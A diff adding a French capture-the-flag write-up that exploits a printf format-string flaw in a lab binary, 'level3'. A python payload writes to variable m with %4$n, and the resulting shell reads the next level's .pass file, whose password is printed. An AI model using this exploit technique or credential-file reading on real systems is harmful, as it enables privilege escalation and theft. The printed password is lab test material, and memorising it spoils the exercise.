@@ -1,0 +1,42 @@
+LEVEL 3
+-------
+
+1.	gdb level3
+
+2.	disas main
+	On voit que la fonction main appelle une fonction annexe, la fonction v()
+	0x08048520 <+6>:	call   0x80484a4 <v>
+
+3.	disas v
+	0x080484da <+54>:	mov    0x804988c,%eax
+	0x080484df <+59>:	cmp    $0x40,%eax
+	Sur la ligne +59 le programme effectue une comparaison entre une variable
+	et le nombre hexa 0x40(64 en décimal).
+	Pour résoudre ce niveau il va falloir modifier la variable.
+
+4.	info variables
+	0x0804988c  m
+	On retient son adresse pour la suite.
+
+5.	Dans ce niveau on va exploiter une faille de printf. On va utiliser le %n
+	qui permet à printf de modifier la valeur d'une variable int.
+	Au %n nous allons y ajouter %4$n qui correspond à la 4ème valeur.
+	Exemple:
+	./level3
+	AAAA %p %p %p %p %p %p
+	AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
+
+	Comme on peut le voir l'adresse AAAA est à la 4ème place et ça ne changera pas.
+
+6.	Nous allons mettre à la place de AAAA, l'adresse de la variable m et ajouter
+	60 octets derrière.
+	python -c 'print "\x8c\x98\x04\x08" + "A"*60+ "%4$n"' > /tmp/lvl3
+
+7.	cat /tmp/lvl3 - | ./level3
+	��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	Wait what?!
+	cat /home/user/level4/.pass
+	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+8.	su level4
+	b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
